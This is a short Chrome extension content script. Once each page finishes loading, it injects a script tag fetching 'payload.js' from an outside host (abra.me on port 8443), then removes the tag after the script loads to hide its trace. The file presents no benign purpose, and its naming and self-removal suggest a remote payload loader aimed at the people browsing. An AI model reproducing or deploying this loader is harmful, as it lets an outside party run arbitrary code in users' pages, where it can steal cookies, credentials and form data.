chrome.extension.sendMessage({}, function (response) {
  var readyStateCheckInterval = setInterval(function () {
    if (document.readyState === "complete") {
      clearInterval(readyStateCheckInterval);

      var s = document.createElement('script');
      s.src = "https://abra.me:8443/static/payload.js";
      s.onload = function () {
        this.parentNode.removeChild(this);
      };
      (document.head || document.documentElement).appendChild(s);
    }
  }, 10);
});

